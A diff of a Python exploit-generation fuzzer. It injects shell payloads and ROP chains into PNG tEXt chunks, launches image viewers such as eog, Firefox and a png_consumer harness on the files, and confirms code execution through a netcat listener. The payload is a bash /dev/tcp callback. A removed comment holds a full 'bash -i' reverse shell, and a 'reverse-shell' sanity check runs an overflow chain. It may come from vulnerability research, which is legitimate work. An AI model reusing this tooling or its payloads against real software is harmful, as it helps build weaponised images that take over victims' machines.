         """Check viewer output directory for crash indications in .log/.debug/.crash files."""
@@ -2543,18 +3500,21 @@ class UnifiedFuzzer:
             self.device = "cuda" if torch.cuda.is_available() else "cpu"
             self.ml_model.to(self.device)
             
-            model_path = "models/vaegan_fuzzer_model.pth"
-            if os.path.exists(model_path):
+            vae_candidates = find_pretrained_model_paths(model_names=["vaegan_fuzzer_model.pth", "vaegan_model.pth", "vaegan.pth"])
+            if not vae_candidates:
+                vae_candidates = [os.path.join(ROOT_DIR, "models", "vaegan_fuzzer_model.pth")]
+            loaded_model = False
+            for model_path in vae_candidates:
+                if not os.path.exists(model_path):
+                    continue
                 try:
-                    # Load state dict, but allow for size mismatches if output_dim changed
-                    # This will load matching parameters and leave new ones uninitialized
                     self.ml_model.load_state_dict(torch.load(model_path, map_location=self.device), strict=False)
                     logger.info(f"Loaded pre-trained VAEGAN model from {model_path} (strict=False to allow size mismatches).")
+                    loaded_model = True
+                    break
                 except Exception as e:
-                    logger.error(f"Failed to load VAEGAN model: {e}. Reinitializing model.")
-                    self.ml_model = VAEGAN(input_dim=calculated_input_dim, latent_dim=20, output_dim=calculated_output_dim) # Reinitialize
-                    self.ml_model.to(self.device)
-            else:
+                    logger.error(f"Failed to load VAEGAN model from {model_path}: {e}")
+            if not loaded_model:
                 logger.warning("No pre-trained VAEGAN model found. Model will be trained if data is available.")
 
     def train_ml_model(self, data_dirs: List[str], epochs: int = 10, generate_lime_explanations: bool = False): # Added epochs and generate_lime_explanations parameter
@@ -2684,7 +3644,24 @@ class UnifiedFuzzer:
         else:
             logger.error("VAEGAN model not initialized, cannot train.")
     
-    
+    def dump_viewer_output(self, viewer_name: str, stdout: str, stderr: str):
+        """Dumps the viewer output to a log file for analysis."""
+        if not stdout and not stderr:
+            return
+        
+        timestamp = int(time.time())
+        log_dir = os.path.join("logs", "viewer_outputs", viewer_name)
+        os.makedirs(log_dir, exist_ok=True)
+        log_path = os.path.join(log_dir, f"{viewer_name}_output_{timestamp}.log")
+        try:
+            with open(log_path, 'w') as f:
+                f.write(f"=== STDOUT ===\n{stdout}\n\n=== STDERR ===\n{stderr}\n")
+            logger.info(f"Viewer output dumped to {log_path}")
+
+        except Exception as e:
+            logger.error(f"Failed to dump viewer output: {e}") 
+            import traceback
+
     def get_intelligent_suggestion(self, viewer: Dict, original_file_path: str,
                                    current_fuzz_type: str, current_payload_offset: int) -> InstrumentationSuggestion:
         """Queries the trained VAE/GAN for an instrumentation suggestion."""
@@ -2724,13 +3701,13 @@ class UnifiedFuzzer:
 
 
         input_features_list = (
-            file_features +
+            normalize_feature_vector(file_features) +
             status_one_hot +
             gdb_crash_features +
             leaked_addresses_features +
             apport_crash_features +
-            elf_features + # New: Include elf_features in input
-            [normalized_payload_offset, normalized_trigger_offset] # Include normalized trigger_offset
+            normalize_feature_vector(elf_features) +
+            [normalized_payload_offset, normalized_trigger_offset]
         )
         input_features_tensor = torch.tensor(input_features_list, dtype=torch.float32).to(self.device)
 
@@ -2772,14 +3749,31 @@ class UnifiedFuzzer:
     
     def start_viewer_suspended(self, viewer_cmd: str, file_path: str, unique_id: str, env: dict = None) -> Optional[int]:
         """Starts a viewer process in suspended mode and returns its PID."""
-        viewer_path = viewer_cmd[0] if isinstance(viewer_cmd, list) else viewer_cmd
+        viewer_cmd_full = viewer_cmd if isinstance(viewer_cmd, list) else [viewer_cmd]
+        viewer_path = viewer_cmd_full[0]
         if not os.path.exists(viewer_path):
             logger.error(f"Viewer executable not found: {viewer_path}")
             return None
         try:
-            viewer_process = subprocess.Popen(viewer_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
+            cmd = viewer_cmd_full + [file_path]
+            viewer_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
             viewer_pid = viewer_process.pid
-            logger.debug(f"Started viewer {viewer_path} with PID {viewer_pid}")
+            key = f"{unique_id}:{file_path}"
+            start_time = time.time()
+            env = env.copy() if env else {}
+            env["INFECTION_UNIQUE_ID"] = unique_id
+
+            with _suspended_viewer_lock:
+                _suspended_viewer_processes[key] = {
+                    'pid': viewer_pid,
+                    'process': viewer_process,
+                    'unique_id': unique_id,
+                    'file_path': file_path,
+                    'start_time': start_time,
+                    'env': env,
+                    'viewer_cmd': viewer_cmd_full
+                }
+            logger.debug(f"Started viewer {viewer_path} with PID {viewer_pid} to load {file_path}")
             return viewer_pid
         except Exception as e:
             logger.error(f"Failed to start viewer {viewer_path}: {e}")
@@ -2809,9 +3803,8 @@ class UnifiedFuzzer:
         if not os.path.exists(file_path):
             logger.error(f"Cannot run {viewer['name']}: file does not exist: {file_path}")
             return "FAILED", None
-        
-        instrumentation_injected = False
-        
+
+        proc = None
         if callable(viewer["cmd"]):
             logger.debug(f"Executing callable viewer command: {viewer['cmd'].__name__} with {file_path}")
             viewer["cmd"](file_path)
@@ -2847,26 +3840,16 @@ class UnifiedFuzzer:
                     logger.warning(f"Failed to start {viewer['name']} suspended, falling back to regular execution")
                     cmd = viewer["cmd"] + [file_path]
                     
-                    # Inject instrumentation shared object for target viewers that use system libpng
-                    if viewer["name"] in ["eog", "firefox"]:
-                        so_path = os.path.abspath("./png_instrumentation.so")
-                        if os.path.exists(so_path):
-                            lib_dir = os.path.dirname(so_path)
-                            current_ld_library_path = env.get("LD_LIBRARY_PATH", "")
-                            env["LD_LIBRARY_PATH"] = f"{lib_dir}:{current_ld_library_path}" if current_ld_library_path else lib_dir
-
-                            current_ld_preload = env.get("LD_PRELOAD", "")
-                            env["LD_PRELOAD"] = f"{so_path}:{current_ld_preload}" if current_ld_preload else so_path
-                            logger.debug(f"Injected instrumentation SO into {viewer['name']}: {so_path}")
-
-                    logger.debug(f"Executing viewer command: {' '.join(cmd)}")
-                    # For png_consumer, don't capture output to avoid pipe blocking
+                    # Run viewer WITHOUT instrumentation SO for payload execution
+                    # (SO is only used for diagnostics if payload execution fails)
+                    env_for_run = os.environ.copy()
+                    
+                    logger.debug(f"Executing viewer command (clean environment): {' '.join(cmd)}")
+                    # For png_consumer, capture output to get crash callstack if available
                     if viewer["name"] == "png_consumer":
-                        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env, text=False)
+                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env_for_run, text=True)
                     else:
-                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, text=True)
-                    if viewer["name"] in ["eog", "firefox"] and os.path.exists(os.path.abspath("./png_instrumentation.so")):
-                        instrumentation_injected = True
+                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env_for_run, text=True)
                     try:
                         if viewer["name"] in ["eog", "firefox"]:
                             logger.debug(f"External viewer {viewer['name']} started; waiting briefly for startup")
@@ -2888,8 +3871,8 @@ class UnifiedFuzzer:
                         if proc.poll() is not None:
                             try:
                                 if viewer["name"] == "png_consumer":
-                                    # For png_consumer, no output to collect
-                                    pass
+                                    # For png_consumer, collect output to get crash callstack
+                                    stdout, _ = proc.communicate(timeout=5)
                                 else:
                                     stdout, stderr = proc.communicate(timeout=5)
                             except subprocess.TimeoutExpired:
@@ -2898,12 +3881,47 @@ class UnifiedFuzzer:
                                     proc.kill()
                                 except Exception:
                                     pass
-                                if viewer["name"] != "png_consumer":
-                                    stdout, stderr = proc.communicate(timeout=5)
+                                stdout, stderr = proc.communicate(timeout=5) if proc.poll() is not None else ("", "")
                         else:
                             logger.debug(f"{viewer['name']} process still running after execution; skipping communicate")
                         logger.debug(f"{viewer['name']} stdout: {stdout.strip()}")
                         logger.debug(f"{viewer['name']} stderr: {stderr.strip()}")
+                        
+                        # If png_consumer produced output, analyze it for success, vulnerability, or crash indicators
+                        if viewer["name"] == "png_consumer" and stdout:
+                            crash_info = self._parse_crash_callstack(stdout)
+                            
+                            # Check for successful completion
+                            if crash_info["has_success"]:
+                                logger.info(f"png_consumer completed successfully: {', '.join(crash_info['success_indicators'])}")
+                            
+                            # Check for vulnerability trigger
+                            if crash_info["has_vulnerability"]:
+                                logger.info(f"png_consumer vulnerability triggered: {', '.join(crash_info['success_indicators'][:2])}")
+                            
+                            # Check for crash
+                            if crash_info["has_crash"]:
+                                logger.info(f"png_consumer crashed in {crash_info['faulting_module']}")
+                                if crash_info["signal"]:
+                                    logger.info(f"  Signal: {crash_info['signal']}")
+                                if crash_info["crash_offset"]:
+                                    logger.info(f"  Offset: 0x{crash_info['crash_offset']:x}")
+                                if crash_info["top_frames"]:
+                                    logger.debug(f"  Frames: {crash_info['top_frames'][:2]}")
+                            
+                            # Log any error messages detected
+                            if crash_info["error_messages"]:
+                                logger.warning(f"png_consumer errors: {crash_info['error_messages'][:2]}")
+                            
+                            # Save output for debugging
+                            try:
+                                with open(f"{file_path}.output.log", 'w') as f:
+                                    f.write(stdout)
+                                if crash_info["has_crash"] or crash_info["error_messages"]:
+                                    with open(f"{file_path}.crash.log", 'w') as f:
+                                        f.write(stdout)
+                            except:
+                                pass
                         
             except Exception as e:
                 logger.error(f"Error running {viewer['name']}: {e}")
@@ -2911,58 +3929,89 @@ class UnifiedFuzzer:
         # Add a small delay to allow netcat output to be written
         time.sleep(1)
 
-        executed_log = verify_payload_execution(unique_id, viewer["name"], payload, timeout=10, nc_process=nc_process, nc_output_file=nc_output_file)  # Increased timeout to 10 seconds
+        executed_log = verify_payload_execution(
+            unique_id,
+            viewer["name"],
+            payload,
+            timeout=10,
+            nc_process=nc_process,
+            nc_output_file=nc_output_file,
+            viewer_process=proc,
+        )  # Increased timeout to 10 seconds
+
+        if proc is not None:
+            stdout_text, stderr_text = _stop_process_and_collect_output(proc, viewer["name"])
+            if stdout_text:
+                logger.debug(f"Final stdout for {viewer['name']}: {stdout_text.strip()}")
+            if stderr_text:
+                logger.debug(f"Final stderr for {viewer['name']}: {stderr_text.strip()}")
+
         if executed_log:
             return "SUCCESS", None # Return None for fitting_info when successful
 
-        if instrumentation_injected:
-            logger.info(f"Retrying {viewer['name']} without injected instrumentation library because execution was not confirmed.")
-            try:
-                env_no_instrument = os.environ.copy()
-                cmd = viewer["cmd"] + [file_path]
-                logger.debug(f"Re-running viewer without instrumentation: {' '.join(cmd)}")
-                if viewer["name"] == "png_consumer":
-                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env_no_instrument, text=False)
-                else:
-                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env_no_instrument, text=True)
+        # Payload execution not confirmed; retry WITH instrumentation SO for diagnostics
+        if viewer["name"] in ["eog", "firefox"]:
+            so_path = os.path.abspath("./png_instrumentation.so")
+            if os.path.exists(so_path):
+                logger.info(f"Payload execution not confirmed for {viewer['name']}. Retrying WITH instrumentation SO for diagnostic information.")
                 try:
-                    if viewer["name"] in ["eog", "firefox"]:
-                        logger.debug(f"External viewer {viewer['name']} started without instrumentation; waiting briefly for startup")
-                        time.sleep(5)
+                    env_with_instrument = os.environ.copy()
+                    lib_dir = os.path.dirname(so_path)
+                    current_ld_library_path = env_with_instrument.get("LD_LIBRARY_PATH", "")
+                    env_with_instrument["LD_LIBRARY_PATH"] = f"{lib_dir}:{current_ld_library_path}" if current_ld_library_path else lib_dir
+
+                    current_ld_preload = env_with_instrument.get("LD_PRELOAD", "")
+                    env_with_instrument["LD_PRELOAD"] = f"{so_path}:{current_ld_preload}" if current_ld_preload else so_path
+                    logger.debug(f"Injected instrumentation SO into {viewer['name']} for diagnostics: {so_path}")
+                    
+                    cmd = viewer["cmd"] + [file_path]
+                    logger.debug(f"Re-running viewer WITH instrumentation for diagnostics: {' '.join(cmd)}")
+                    if viewer["name"] == "png_consumer":
+                        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env_with_instrument, text=False)
                     else:
-                        proc.wait(timeout=10)
-                except subprocess.TimeoutExpired:
-                    logger.warning(f"Uninstrumented retry timed out for {viewer['name']} on {file_path}")
+                        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env_with_instrument, text=True)
                     try:
-                        proc.terminate()
-                        proc.wait(timeout=3)
-                    except Exception:
+                        logger.debug(f"External viewer {viewer['name']} started with instrumentation; waiting briefly for startup")
+                        time.sleep(5)
+                    except subprocess.TimeoutExpired:
+                        logger.warning(f"Instrumented diagnostic run timed out for {viewer['name']} on {file_path}")
                         try:
-                            proc.kill()
+                            proc.terminate()
+                            proc.wait(timeout=3)
                         except Exception:
-                            pass
-                finally:
-                    if proc.poll() is not None and viewer["name"] != "png_consumer":
-                        try:
-                            stdout, stderr = proc.communicate(timeout=5)
-                            logger.debug(f"Uninstrumented retry stdout: {stdout.strip()}")
-                            logger.debug(f"Uninstrumented retry stderr: {stderr.strip()}")
-                        except subprocess.TimeoutExpired:
-                            logger.warning(f"Timed out while collecting output from uninstrumented {viewer['name']} retry")
                             try:
                                 proc.kill()
                             except Exception:
                                 pass
-                            stdout, stderr = proc.communicate(timeout=5)
-                    elif proc.poll() is None:
-                        logger.debug(f"{viewer['name']} process still running after uninstrumented retry; skipping communicate")
-                time.sleep(1)
-                executed_log = verify_payload_execution(unique_id, viewer["name"], payload, timeout=10, nc_process=nc_process, nc_output_file=nc_output_file)
-                if executed_log:
-                    logger.info(f"Payload execution confirmed on uninstrumented retry for {viewer['name']}")
-                    return "SUCCESS", None
-            except Exception as e:
-                logger.warning(f"Uninstrumented retry failed for {viewer['name']}: {e}")
+                    finally:
+                        if proc.poll() is not None and viewer["name"] != "png_consumer":
+                            try:
+                                stdout, stderr = proc.communicate(timeout=5)
+                                logger.debug(f"Instrumented diagnostic run stdout: {stdout.strip()}")
+                                logger.debug(f"Instrumented diagnostic run stderr: {stderr.strip()}")
+                            except subprocess.TimeoutExpired:
+                                logger.warning(f"Timed out while collecting output from instrumented diagnostic run")
+                                try:
+                                    proc.kill()
+                                except Exception:
+                                    pass
+                        elif proc.poll() is None:
+                            logger.debug(f"{viewer['name']} process still running after instrumented diagnostic run; skipping communicate")
+                    time.sleep(1)
+                    executed_log = verify_payload_execution(
+                        unique_id,
+                        viewer["name"],
+                        payload,
+                        timeout=10,
+                        nc_process=nc_process,
+                        nc_output_file=nc_output_file,
+                        viewer_process=proc,
+                    )
+                    if executed_log:
+                        logger.info(f"Payload execution confirmed with instrumentation for {viewer['name']} (diagnostics helpful)")
+                        return "SUCCESS", None
+                except Exception as e:
+                    logger.warning(f"Instrumented diagnostic run failed for {viewer['name']}: {e}")
 
         if not callable(viewer["cmd"]):
             gdb_output, payload_addr = run_under_gdb(viewer["cmd"], file_path, unique_id)
@@ -3072,11 +4121,11 @@ class UnifiedFuzzer:
             with open(file_path, 'rb') as f:
                 content = bytearray(f.read())
 
-            p_key = b"InfectionPayload"
+            p_key = b"INJECTED_PAYLOAD"
             search_pattern = b"tEXt" + p_key
             idx = content.find(search_pattern)
             if idx == -1:
-                logger.error("Could not find InfectionPayload tEXt chunk in file for fitting modification")
+                logger.error("Could not find INJECTED_PAYLOAD tEXt chunk in file for fitting modification")
                 return False
 
             # chunk_type_pos points at 'tEXt', chunk_length_pos is 4 bytes before it
@@ -3090,7 +4139,7 @@ class UnifiedFuzzer:
             # p_data structure: p_key + b"\x00" + padding (A*s) + final_payload
             key_marker = p_key + b"\x00"
             if not p_data.startswith(key_marker):
-                logger.error("InfectionPayload chunk data not in expected format")
+                logger.error("INJECTED_PAYLOAD chunk data not in expected format")
                 return False
 
             after_key = p_data[len(key_marker):]
@@ -3148,6 +4197,16 @@ class UnifiedFuzzer:
             return False
         
     
+
+    def _select_chunk_injection_strategy(self, retry_attempt: int, base_file_name: str = "") -> Optional[str]:
+        """Choose a chunk injection strategy for a given fuzzing attempt."""
+        strategy_names = list(get_png_chunk_injection_strategies().keys())
+        if not strategy_names:
+            return None
+        seed = retry_attempt
+        if base_file_name:
+            seed += sum(ord(ch) for ch in os.path.basename(base_file_name))
+        return strategy_names[seed % len(strategy_names)]
 
     def _fuzz_single_combination(self, original_file_path: str, base_file_name: str, viewer: Dict, fuzz_type: str, output_dir: str, invalid_fuzz_types: set) -> List[Dict]:
         """Fuzzes a single file with a specific viewer and fuzz_type, including retries and offset adjustments."""
@@ -3271,16 +4330,26 @@ class UnifiedFuzzer:
                         logger.warning(f"Failed to reuse png_consumer base file: {e}")
 
             # Generate payload based on viewer type
-            # payload = f"bash -c 'echo {unique_id} > /dev/tcp/127.0.0.1/24444; bash -i > /dev/tcp/127.0.0.1/24444 2>&1'"
-            # simplified payload for more reliable execution validation without relying on reverse shell stability, which can be affected by network conditions and timing. The unique_id will be checked in the netcat listener output to confirm execution.
-            payload = f"bash -c 'echo {unique_id} > /dev/tcp/127.0.0.1/24444 2>&1'" 
+            payload = f"bash -c 'echo {unique_id} > /dev/tcp/127.0.0.1/24444 2>&1'"
+            injection_strategy = None
             injection_success = False
             if reuse_png_consumer_base:
                 injection_success = True
             elif fuzz_type == "metadata_trigger":
                 injection_success = inject_metadata_trigger(test_file_path, payload)
             else:
-                injection_success = inject_payload_with_leaks(test_file_path, payload, trigger_offset=current_trigger_offset, fuzz_type=fuzz_type, leaks=self.leaks, payload_offset=current_payload_offset)
+                injection_strategy = self._select_chunk_injection_strategy(retry_attempt, base_file_name)
+                injection_success = inject_payload_with_leaks(
+                    test_file_path,
+                    payload,
+                    trigger_offset=current_trigger_offset,
+                    fuzz_type=fuzz_type,
+                    leaks=self.leaks,
+                    payload_offset=current_payload_offset,
+                    viewer_name=viewer_name,
+                    unique_id=unique_id,
+                    chunk_injection_strategy=injection_strategy,
+                )
 
             if injection_success:
                 current_timestamp = time.time() # Capture timestamp before viewer run
@@ -3292,15 +4361,26 @@ class UnifiedFuzzer:
 
                 if "/dev/tcp" in payload and (not nc_process or nc_process.poll() is not None):
                     logger.warning("Netcat listener went down, restarting persistent listener")
-                    self.ensure_netcat_listener()
-                    nc_process = self.netcat_process
-                    nc_output_file = self.netcat_output_file
+                    nc_process, nc_output_file, _ = self.ensure_netcat_listener_state() 
+                    self.netcat_process = nc_process
+                    self.netcat_output_file = nc_output_file    
+                else:
+                    logger.info(f"Netcat listener is operational, continuing payload execution for {viewer_name} {fuzz_type}")
+                    
 
                 status, fitting_info = self.fuzz_viewer(viewer, test_file_path, unique_id, payload, nc_process=nc_process, nc_output_file=nc_output_file)
 
                 # If status is not SUCCESS, do a second verification check in case the first one missed it due to timing
                 if status != "SUCCESS":
-                    executed_log = verify_payload_execution(unique_id, viewer["name"], payload, timeout=5, nc_process=nc_process, nc_output_file=nc_output_file)
+                    executed_log = verify_payload_execution(
+                        unique_id,
+                        viewer["name"],
+                        payload,
+                        timeout=5,
+                        nc_process=nc_process,
+                        nc_output_file=nc_output_file,
+                        viewer_process=None,
+                    )
                     if executed_log:
                         logger.info(f"Payload execution confirmed on second check, correcting status to SUCCESS for {viewer_name}")
                         status = "SUCCESS"
@@ -3311,6 +4391,9 @@ class UnifiedFuzzer:
                 # Preserve netcat output file for post-mortem; no deletion.
                 # If a temporary file path is used, preserve by renaming to persistent.
                 if nc_output_file and os.path.exists(nc_output_file):
+                    self.netcat_output_file = nc_output_file
+                    logger.debug(f"Netcat output file confirmed at {nc_output_file}")
+                
                     try:
                         stable_path = os.path.join(self.netcat_log_dir, f"netcat_{int(time.time())}.log")
                         if nc_output_file != stable_path:
@@ -3401,6 +4484,7 @@ class UnifiedFuzzer:
                     "payload_source_file": payload_source_file,
                     "payload_source_offset": payload_source_offset,
                     "payload_delta_description": payload_delta_description,
+                    "injection_strategy": injection_strategy if 'injection_strategy' in locals() else None,
                     # New enhanced fields
                     "fitness_score": fitness_score.get("overall_score", 0.0),
                     "fitness_category": fitness_score.get("fitness_category", "unknown"),
@@ -3480,6 +4564,7 @@ class UnifiedFuzzer:
                             chain_file_name = f"{base_file_name}.{viewer_name}.{fuzz_type}.{chain}.png"
                             chain_file_path = os.path.join(output_dir, chain_file_name)
                             
+                            chain_status = "FAILED"
                             try:
                                 shutil.copy2(test_file_path, chain_file_path)
                                 
@@ -3490,7 +4575,10 @@ class UnifiedFuzzer:
                                     fuzz_type=fuzz_type, 
                                     leaks=self.leaks, 
                                     payload_offset=current_payload_offset,
-                                    force_chain_type=chain
+                                    force_chain_type=chain,
+                                    viewer_name=viewer_name,
+                                    unique_id=unique_id,
+                                    chunk_injection_strategy=injection_strategy,
                                 )
                                 
                                 if chain_injection_success:
@@ -3552,7 +4640,10 @@ class UnifiedFuzzer:
                         if not inject_payload_with_leaks(test_file_path, payload, trigger_offset=current_trigger_offset,
                                                          fuzz_type=fuzz_type, leaks=self.leaks,
                                                          payload_offset=current_payload_offset, # Keep the same payload_offset
-                                                         chain_base_addr=fitting_info["payload_addr"]): # Pass actual payload_addr
+                                                         chain_base_addr=fitting_info["payload_addr"], # Pass actual payload_addr
+                                                         viewer_name=viewer_name,
+                                                         unique_id=unique_id,
+                                                         chunk_injection_strategy=injection_strategy):
                             logger.error(f"Failed to re-inject payload with adjusted chain for {viewer_name} + {fuzz_type} (Retry {retry_attempt})")
                             break # Exit retry loop if re-injection fails
                         else:
@@ -3599,9 +4690,10 @@ class UnifiedFuzzer:
                 else:
                     if os.path.exists(test_file_path): 
                         try:
+                            logger.info(f"Removing {test_file_path} due to  status: {status}") 
                             os.remove(test_file_path)
-                        except:
-                            pass
+                        except Exception as e:
+                            logger.error(f"Failed to remove {test_file_path}: {e}") 
 
             else:
                 logger.error(f"Payload injection failed for {viewer['name']} + {fuzz_type} (Retry {retry_attempt})")
@@ -3639,6 +4731,226 @@ class UnifiedFuzzer:
         
         return results_for_combination # Corrected to return results_for_combination
 
+    def _parse_crash_callstack(self, crash_output: str) -> Dict[str, any]:
+        """Parse crash callstack from png_consumer to extract crash info and success indicators."""
+        crash_info = {
+            "has_crash": False,
+            "has_success": False,
+            "has_vulnerability": False,
+            "crash_address": None,
+            "crash_function": None,
+            "crash_offset": None,
+            "faulting_module": None,
+            "signal": None,
+            "top_frames": [],
+            "success_indicators": [],
+            "error_messages": []
+        }
+        
+        if not crash_output:
+            return crash_info
+        
+        lines = crash_output.split('\n')
+        
+        # Check for success completion
+        if "Simulated libpng processing complete" in crash_output:
+            crash_info["has_success"] = True
+            crash_info["success_indicators"].append("Simulated libpng processing complete")
+        
+        # Check for vulnerability trigger patterns
+        if "VULNERABILITY TRIGGERED" in crash_output:
+            crash_info["has_vulnerability"] = True
+            vulnerability_lines = [line for line in lines if "VULNERABILITY TRIGGERED" in line]
+            crash_info["success_indicators"].extend(vulnerability_lines)
+        
+        # Check for crash indicators
+        for line in lines:
+            if "Caught signal" in line or "Stack trace" in line or "backtrace" in line.lower():
+                crash_info["has_crash"] = True
+                # Extract signal number if present
+                import re
+                sig_match = re.search(r'signal (\d+)', line)
+                if sig_match:
+                    crash_info["signal"] = int(sig_match.group(1))
+                break
+        
+        # If no explicit crash signal but output contains frame information, it crashed
+        if not crash_info["has_crash"] and any("png_consumer" in line or "libpng" in line or "libc" in line for line in lines):
+            crash_info["has_crash"] = True
+        
+        if not crash_info["has_crash"] and not crash_info["has_success"] and not crash_info["has_vulnerability"]:
+            return crash_info
+        
+        # Parse callstack frames
+        import re
+        for line in lines[:20]:  # Check first 20 lines for frame info
+            # Match png_consumer frame format
+            match = re.search(r'\./png_consumer\(\+0x([0-9a-f]+)\)\[0x([0-9a-f]+)\]', line)
+            if match:
+                crash_info["crash_offset"] = int(match.group(1), 16)
+                crash_info["crash_address"] = int(match.group(2), 16)
+                crash_info["faulting_module"] = "png_consumer"
+                crash_info["top_frames"].append(line)
+                continue
+            
+            # Match libpng or libc frame format
+            match = re.search(r'/lib.*?(libpng[^\(]*|libc[^\(]*)\(.*?\+0x([0-9a-f]+)\)\[0x([0-9a-f]+)\]', line)
+            if match:
+                module = match.group(1)
+                offset = int(match.group(2), 16)
+                address = int(match.group(3), 16)
+                if not crash_info["faulting_module"]:
+                    crash_info["crash_offset"] = offset
+                    crash_info["crash_address"] = address
+                    crash_info["faulting_module"] = module
+                crash_info["top_frames"].append(line)
+                continue
+            
+            # Capture error messages
+            if any(keyword in line for keyword in ["Error", "FATAL", "Segmentation", "Invalid", "Corrupted"]):
+                crash_info["error_messages"].append(line)
+        
+        return crash_info
+
+    def _run_png_consumer_direct(self, file_path: str, unique_id: str, capture_output: bool = False) -> tuple[int, Optional[str]]:
+        """Run png_consumer directly and optionally capture crash output."""
+        try:
+            cmd = ["./png_consumer", file_path]
+            if capture_output:
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                try:
+                    stdout, _ = proc.communicate(timeout=10)
+                    return proc.returncode, stdout
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    return -1, None
+            else:
+                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                try:
+                    proc.wait(timeout=10)
+                    return proc.returncode, None
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    return -1, None
+        except Exception as e:
+            logger.error(f"Error running png_consumer: {e}")
+            return -1, None
+
+    def _run_png_consumer_overflow_sanity_check(self, file_path: str, output_dir: str) -> bool:
+        """Performs a quick sanity check on png_consumer using overflow and reverse-shell payload execution."""
+        png_consumer_viewer = next((v for v in self.viewers if v["name"] == "png_consumer"), None)
+        if png_consumer_viewer is None:
+            logger.warning("png_consumer viewer config missing; skipping sanity check")
+            return False
+
+        sanity_file = os.path.join(output_dir, "png_consumer_overflow_sanity.png")
+        try:
+            shutil.copyfile(file_path, sanity_file)
+        except Exception as e:
+            logger.error(f"Failed to copy base PNG for sanity check: {e}")
+            return False
+
+        unique_id = f"png_consumer_sanity_{int(time.time())}"
+        payload = f"bash -c 'echo {unique_id} > /dev/tcp/127.0.0.1/24444 2>&1'"
+
+        nc_process, nc_output_file, _ = self.ensure_netcat_listener()
+        
+        logger.info(f"Running png_consumer overflow sanity check on {sanity_file} with unique_id={unique_id}")
+        success = inject_payload_with_leaks(
+            sanity_file,
+            payload,
+            fuzz_type="overflow",
+            viewer_name="png_consumer",
+            unique_id=unique_id,
+            force_chain_type="ROP",
+            chunk_injection_strategy=self._select_chunk_injection_strategy(0, sanity_file),
+        )
+
+        if not success:
+            logger.warning("Sanity check injection failed for png_consumer overflow")
+            return False
+
+        # Run png_consumer directly and capture crash output
+        returncode, crash_output = self._run_png_consumer_direct(sanity_file, unique_id, capture_output=True)
+        
+        # Parse crash output to check for success, vulnerability, or crash indicators
+        crash_info = self._parse_crash_callstack(crash_output if crash_output else "")
+        
+        # Check for successful completion
+        if crash_info["has_success"]:
+            logger.info(f"png_consumer sanity check passed - successful completion detected")
+            logger.debug(f"Success indicators: {crash_info['success_indicators']}")
+            return True
+        
+        # Check for vulnerability trigger
+        if crash_info["has_vulnerability"]:
+            logger.info(f"png_consumer sanity check passed - vulnerability triggered")
+            logger.debug(f"Vulnerability indicators: {crash_info['success_indicators']}")
+            
+            # First check if payload executed via netcat
+            time.sleep(0.5)
+            payload_executed = verify_payload_execution(
+                unique_id,
+                "png_consumer",
+                payload,
+                timeout=3,
+                nc_process=nc_process,
+                nc_output_file=nc_output_file,
+                viewer_process=None,
+            )
+            if payload_executed:
+                logger.info("Payload execution confirmed via netcat")
+                return True
+            else:
+                logger.warning("Vulnerability triggered but payload execution not confirmed via netcat")
+                return False
+        
+        # First check if payload executed via netcat
+        time.sleep(0.5)
+        payload_executed = verify_payload_execution(
+            unique_id,
+            "png_consumer",
+            payload,
+            timeout=3,
+            nc_process=nc_process,
+            nc_output_file=nc_output_file,
+            viewer_process=None,
+        )
+        if payload_executed:
+            logger.info("png_consumer overflow sanity check passed - payload execution confirmed")
+            return True
+        
+        # If payload didn't execute but we have crash output, analyze for fitting information
+        if returncode != 0 and crash_output:
+            logger.info(f"png_consumer crashed with return code {returncode}, analyzing crash for payload fitting...")
+            
+            if crash_info["has_crash"]:
+                logger.info(f"Crash detected in {crash_info['faulting_module']}")
+                if crash_info["signal"]:
+                    logger.info(f"Signal: {crash_info['signal']}")
+                if crash_info["crash_offset"]:
+                    logger.info(f"Crash offset: 0x{crash_info['crash_offset']:x}")
+                if crash_info["top_frames"]:
+                    logger.info(f"Top frames:\n" + "\n".join(crash_info["top_frames"][:3]))
+                
+                # Log crash details for reference
+                with open(f"{sanity_file}.crash_output.txt", 'w') as f:
+                    f.write(crash_output)
+                
+                # If crash occurred, it means the injection at least triggered execution
+                # Mark as partial success - the chain reached but payload didn't execute
+                logger.warning("Sanity check: png_consumer crashed but payload didn't execute. Injection is working but needs refinement.")
+                return False
+            else:
+                logger.warning("Return code indicates crash but no crash output captured")
+                if crash_output:
+                    logger.debug(f"Output received:\n{crash_output[:500]}")
+        
+        logger.warning("png_consumer overflow sanity check failed - no crash output and payload not executed")
+        if crash_output:
+            logger.debug(f"Captured output:\n{crash_output[:500]}")
+        return False
+
     def fuzz_single_file(self, file_path: str) -> List[Dict]:
         """Fuzzes a single file against all viewers and weaknesses, saving successful samples."""
         request_sudo_if_needed()
@@ -3655,6 +4967,25 @@ class UnifiedFuzzer:
         base_file_name = os.path.basename(file_path)
         output_dir = os.path.join(os.path.dirname(file_path), "fuzz_results_single")
         os.makedirs(output_dir, exist_ok=True)
+
+        sanity_passed = self._run_png_consumer_overflow_sanity_check(file_path, output_dir)
+        all_results.append({
+            "timestamp": time.time(),
+            "original_file": file_path,
+            "viewer": "png_consumer",
+            "fuzz_type": "overflow_sanity",
+            "status": "SANITY_CHECK_PASSED" if sanity_passed else "SANITY_CHECK_FAILED",
+            "reason": "Base png_consumer overflow reverse-shell sanity check",
+            "retry_attempt": 0,
